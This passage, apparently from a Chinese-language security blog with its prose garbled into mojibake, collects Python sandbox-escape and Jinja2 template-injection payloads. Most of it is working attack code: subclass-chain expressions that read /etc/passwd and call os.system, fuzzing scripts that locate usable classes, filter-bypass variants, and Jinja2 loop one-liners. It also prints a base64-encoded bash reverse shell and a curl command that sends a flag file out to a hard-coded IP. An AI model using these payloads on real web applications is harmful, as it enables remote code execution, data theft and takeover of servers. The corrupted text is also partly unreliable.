&#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;] 4ã€æ–‡ä»¶è¯»å– Payload 1 å‘ç°40çš„åœ°æ–¹å­˜åœ¨ &lt;type &#39;file&#39;&gt; 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()request.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() æŸ¥ä¸‹æ ‡ 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&#39;file&#39;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 5ã€å‘½ä»¤æ‰§è¡Œ å¯»æ‰¾åŒ…å«osæ¨¡å—çš„è„šæœ¬ 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 å¾—åˆ° 12345671 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt; å‰é¢å·²ç»æ‰¾åˆ°äº†åŒ…å«osæ¨¡å—çš„ç±»ï¼Œå…ˆåˆå§‹åŒ–ï¼Œå†å¼•ç”¨å³å¯ 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) åªä¸è¿‡å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦åå¼¹shellæˆ–è€…åˆ©ç”¨curlå¸¦å‡º åå¼¹shell 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;) curlå¸¦å‡º 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;117.78.1.204&#x2F;?data&#x3D;$data;&#39;) catch_warningsä¹Ÿå¯ä»¥è¿›ä¸€æ­¥æ„é€ æ¥æ‰§è¡Œå‘½ä»¤ 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; å…ˆä»‹ç»ä¸¤ä¸ªå±æ€§ï¼Œå·²çŸ¥å‡½æ•°åå¯è·å–å‡½æ•°ä¿¡æ¯ 1234567891011def fun(x&#x3D;1): # nothing here a&#x3D;x*2 flag&#x3D;&#39;neko&#39; return aprint fun.func_code.co_constsprint fun.func_globals&#x3D;&gt;(None, 2, &#39;neko&#39;)&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125; å¯æ„é€  1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) è¿˜æœ‰å‡ ç§å˜å½¢ 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125; Python3Python 3.7.5 1ã€è·å–ç±»å¯¹è±¡ 123456&gt;&gt;&gt; &#39;&#39;.__class__&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; [].__class__&lt;class &#39;list&#39;&gt; 2ã€å¯»æ‰¾åŸºç±»object 1234567&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &#39;object&#39;&gt; 3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨ 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;] 4ã€æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ 3ä¸ªæœ¬åœ°æµ‹è¯•æˆåŠŸçš„payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;127&lt;class &#39;os._wrap_close&#39;&gt;-1&lt;class &#39;rlcompleter.Completer&#39;&gt; é€šè¿‡è§‚å¯Ÿï¼Œå…¶å®å°±æ˜¯__global__ä¸­å­˜åœ¨sysæˆ–è€…systemæˆ–è€…__builtins__æ¨¡å— FUZZè„šæœ¬ 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzzå‡ºå¾ˆå¤šå…¶ä»–çš„ï¼Œæµ‹è¯•ä¸€ä¸‹ å°è¯•è‡ªå·±æ„é€ forå¾ªç¯ 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#39;sys&#39; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¸€ä¸ª0ä»£è¡¨æ‰§è¡Œä¸€æ¬¡ğŸ¤¦â€â™‚ï¸ï¼Œå‘½ä»¤æ‰§è¡Œçš„ç»“æœæ— æ³•å›æ˜¾ï¼Œåˆ©ç”¨curlå¸¦å‡º å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šæ¨¡å—åï¼Œå°±å¯ä»¥åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ¯”å¦‚å‰é¢FUZZå‡ºæ¥çš„ 1sys 128 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; æ³¨æ„æ˜¯ååŠéƒ¨åˆ†Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¸Šé¢ä¸‰ä¸ªæ¨¡å—ä¸­__builtins__æœ€ä¸ºä¸°å¯Œ 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() æ¯”å¦‚è¿˜æœ‰chr()å‡½æ•° Jinja2çš„forå¾ªç¯å¤„ç† 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; evalæ‰§è¡Œçš„å¥½å¤„æ˜¯ç›´æ¥æœ‰å›æ˜¾ï¼Œ Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰.è¢«è¿‡æ»¤ 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;) ä½¿ç”¨getattr() 123456[].__class__ &#x3D;&gt; getattr([],&#39;__class__&#39;)[].__class__.__base__ &#x3D;&gt; getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)[].__class__.__base__.__subclasses__()[59] &#x3D;&gt; getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59][].__class__.__base__.__subclasses__()[59].__init__ &#x3D;&gt; getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) _è¢«è¿‡æ»¤ 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) ä¸­æ‹¬å·è¢«è¿‡æ»¤ 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() å¯ä»¥ç”¨getitemå’Œpopè¿›è¡Œç»•è¿‡è¿‡æ»¤ 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() å¼•å·è¢«è¿‡æ»¤ å…ˆè·å–chr()å†å°†æ–‡ä»¶åæ‹¼æ¥ 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; è¿‡æ»¤åŒæ‹¬å·)) åˆ©ç”¨æ–‡ä»¶ç›²æ³¨ 1&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125; å†™ä¸ªè„šæœ¬å³å¯ æ€»ç»“é€šç”¨çš„payload åŸºç±» 12&#39;&#39;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; ä¸‹æ ‡ä¸€èˆ¬æ˜¯40ï¼Œå¦‚æœä¸è¡Œçš„è¯ä¹Ÿå¯çˆ†ç ´è¯•è¯• 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() osã€__builtins__ã€linecacheæ¨¡å— å¯»æ‰¾ç›¸åº”æ¨¡å—.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) è¿™é‡Œæœ‰å¾ˆå¤šå˜å½¢å¯ä»¥å‚è€ƒä¸Šé¢çš„ jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­ 12345&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sysã€systemã€__builtins__æ¨¡å—ï¼Œå…¶ä¸­__builtins__å’Œpython2çš„ç•¥æœ‰ä¸åŒ å¯»æ‰¾ç›¸åº”æ¨¡å—.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­ 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================åˆ†å‰²çº¿ å®‰æ’æ¯æŠ—ç–«æœˆèµ› æ²¡æ‰“æ¯”èµ›ï¼Œä¼¼ä¹æ˜¯è¿‡æ»¤äº†.å’Œ_ï¼Œ æˆ‘æƒ³åˆ°çš„payload 